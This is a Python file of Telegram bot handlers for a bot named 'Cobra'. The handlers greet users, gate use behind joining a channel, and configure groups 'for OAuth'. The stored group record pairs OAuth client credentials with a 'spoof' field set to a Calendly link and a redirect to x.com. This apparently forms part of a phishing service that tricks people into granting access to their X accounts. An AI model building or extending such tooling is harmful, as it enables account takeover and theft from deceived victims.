import uuid
from bot.handlers import keyboards

from shared.db import get_db
from shared.utils import parse, private_check

parse_mode = "MarkdownV2"

db = get_db()
groups = db["groups"]

async def start(update, context):
    chat_id = update.effective_chat.id

    full_name = parse(update.effective_user.full_name)

    reply_markup = keyboards.add_to_group()
    text = f"🐍 *Welcome to Cobra, _{full_name}_*\\! 🐍\n\n💬 _To get started, add me to a group and use the */setup* command to setup your group for OAuth\\._"

    await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup)

async def unsubscribed(update, context):
    chat_id = update.effective_chat.id

    reply_markup = keyboards.unsubscribed()
    text = "❗ *JOIN THE CHANNEL TO USE COBRA* ❗\n\n_⚠️ It seems that you aren't in the channel\\. Join the channel using the button below to continue\\._"
    
    await context.bot.send_message(chat_id, text, parse_mode, reply_markup=reply_markup)

async def setup(update, context):
    chat_id = update.effective_chat.id

    if private_check(update): return

    group = groups.find_one({"group_id": chat_id})
    if group:
        text = "⚠️ *This group is already setup for OAuth\\.*"
        return await context.bot.send_message(chat_id, text, parse_mode)

    owner = next(admin.user for admin in await context.bot.get_chat_administrators(update.effective_chat.id) if admin.status == "creator")
    owner_id = owner.id
    owner_fullname = parse(owner.full_name)

    chat_title = update.effective_chat.title

    group_data = {
        "owner_id": owner_id,
        "group": {
            "id": chat_id,
            "title": chat_title
        },
        "client": {
            "id": "",
            "secret": ""
        },
        "spoof": "https://calendly.com/cointele",
        "redirect": "https://x.com",
        "replies": False,
        "identifiers": [
            {
                "user_id": owner_id,
                "identifier": str(uuid.uuid4())
            }
        ],
        "users": []
    }
    groups.insert_one(group_data)

    text = f"✅ *Group successfully setup for OAuth\\.*\n\n╭  ℹ️ *GROUP INFO*\n┣  *Group ID:* {chat_id}\n┣  *Group Name:* {parse(chat_title)}\n┣  *Owner ID*: {owner_id}\n╰  *Owner Name:* {owner_fullname}\n\n💬 _Use the */help* command to get the list of available commands\\._"
    await context.bot.send_message(chat_id, text, parse_mode)